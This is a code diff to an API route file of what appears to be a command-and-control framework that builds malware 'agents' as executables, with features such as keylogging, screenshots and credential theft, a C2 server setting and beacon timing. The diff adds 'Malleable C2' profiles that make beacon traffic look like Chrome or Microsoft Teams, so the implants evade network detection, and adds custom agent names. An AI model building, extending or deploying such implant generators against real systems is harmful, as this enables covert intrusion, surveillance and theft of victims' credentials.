@@ -1,7 +1,7 @@
 """
 Agent Generator API Routes
 
-Endpoints for generating agents.
+Endpoints for generating agents with Malleable C2 profile support.
 """
 
 from fastapi import APIRouter, Depends, HTTPException
@@ -13,6 +13,7 @@ import os
 from app.services.agent_builder import AgentBuilder
 from app.services.agent_generator import AgentGenerator
 from app.services.agent_factory import AgentFactory
+from app.services.communication.profiles import AVAILABLE_PROFILES
 from app.api.deps import get_current_operator
 from app.models.database.operator import Operator
 
@@ -27,6 +28,8 @@ class AgentGenerateRequest(BaseModel):
     sleep_interval: int = 60
     jitter: float = 0.0
     encryption_enabled: bool = False
+    custom_name: Optional[str] = None
+    profile: str = "chrome_browser"  # ← ADDED: Malleable C2 profile
 
 
 @router.get("/platforms")
@@ -37,11 +40,6 @@ async def get_platforms(
     Get supported platforms.
     
     GET /api/v1/generator/platforms
-    
-    Response:
-    {
-        "platforms": ["windows", "linux", "macos"]
-    }
     """
     return {
         "platforms": AgentFactory.get_supported_platforms()
@@ -57,12 +55,6 @@ async def get_features(
     Get available features for a platform.
     
     GET /api/v1/generator/features/windows
-    
-    Response:
-    {
-        "platform": "windows",
-        "features": ["keylogger", "screenshot", "credentials"]
-    }
     """
     try:
         features = AgentFactory.get_features_for_platform(platform)
@@ -74,13 +66,43 @@ async def get_features(
         raise HTTPException(status_code=400, detail=str(e))
 
 
+@router.get("/profiles")
+async def get_profiles(
+    current_user: Operator = Depends(get_current_operator)
+):
+    """
+    Get available Malleable C2 profiles.
+    
+    GET /api/v1/generator/profiles
+    
+    Response:
+    {
+        "profiles": [
+            {
+                "name": "chrome_browser",
+                "description": "Mimics Google Chrome browser traffic"
+            },
+            ...
+        ]
+    }
+    """
+    profiles = []
+    for profile_name, profile in AVAILABLE_PROFILES.items():
+        profiles.append({
+            "name": profile.name,
+            "description": profile.description
+        })
+    
+    return {"profiles": profiles}
+
+
 @router.post("/generate")
 async def generate_agent(
     request: AgentGenerateRequest,
     current_user: Operator = Depends(get_current_operator)
 ):
     """
-    Generate a new agent and build standalone executable.
+    Generate a new agent with Malleable C2 profile.
     
     POST /api/v1/generator/generate
     {
@@ -89,21 +111,17 @@ async def generate_agent(
         "features": ["screenshot"],
         "sleep_interval": 60,
         "jitter": 0.2,
-        "encryption_enabled": false
-    }
-    
-    Response:
-    {
-        "success": true,
-        "agent_id": "abc123",
-        "python_file": "agent_abc123.py",
-        "executable": "agent_abc123.exe",
-        "download_python": "/api/v1/generator/download/agent_abc123.py",
-        "download_executable": "/api/v1/generator/download/agent_abc123.exe"
+        "encryption_enabled": false,
+        "custom_name": "mytestagent",
+        "profile": "microsoft_teams"  // ← NEW
     }
     """
     
     try:
+        # Validate profile
+        if request.profile not in AVAILABLE_PROFILES:
+            raise ValueError(f"Invalid profile: {request.profile}. Available: {', '.join(AVAILABLE_PROFILES.keys())}")
+        
         # Build configuration
         builder = AgentBuilder()
         
@@ -112,11 +130,21 @@ async def generate_agent(
             .set_c2_server(request.c2_server)
             .add_features(request.features)
             .set_beacon(request.sleep_interval, request.jitter)
+            .set_profile(request.profile)  # ← ADDED: Set profile
         )
         
+        # Set custom name if provided
+        if request.custom_name and request.custom_name.strip():
+            print(f"🏷️  Using custom name: {request.custom_name}")
+            config = config.set_custom_name(request.custom_name.strip())
+        else:
+            print(f"🏷️  Using auto-generated name")
+        
+        # Enable encryption if requested
         if request.encryption_enabled:
             config = config.enable_encryption()
         
+        # Build final configuration
         config = config.build()
         
         # Generate agent and executable
@@ -136,7 +164,8 @@ async def generate_agent(
                 "features": config["features"],
                 "sleep_interval": config["sleep_interval"],
                 "jitter": config["jitter"],
-                "encryption_enabled": config["encryption_enabled"]
+                "encryption_enabled": config["encryption_enabled"],
+                "profile": config["profile"]  # ← ADDED: Include profile in response
             }
         }
         
@@ -156,7 +185,7 @@ async def generate_agent(
                 "deployment_note": "Executable build failed. Use Python file or rebuild manually."
             })
         
-        print(f"✅ Agent generated by {current_user.username}: {python_filename}")
+        print(f"✅ Agent generated by {current_user.username}: {python_filename} (Profile: {request.profile})")
         
         return response_data
     
@@ -173,11 +202,6 @@ async def download_agent(
 ):
     """
     Download generated agent (Python source or executable).
-    
-    GET /api/v1/generator/download/agent_abc123.py
-    GET /api/v1/generator/download/agent_abc123.exe
-    
-    Returns: File download
     """
     from pathlib import Path
     
@@ -194,10 +218,6 @@ async def download_agent(
         # Python source file
         output_dir = backend_dir / "generated_agents"
         filepath = output_dir / filename
-    
-    # Debug
-    print(f"🔍 Looking for file at: {filepath}")
-    print(f"🔍 File exists: {filepath.exists()}")
     
     if not filepath.exists():
         raise HTTPException(status_code=404, detail=f"File not found: {filename}")
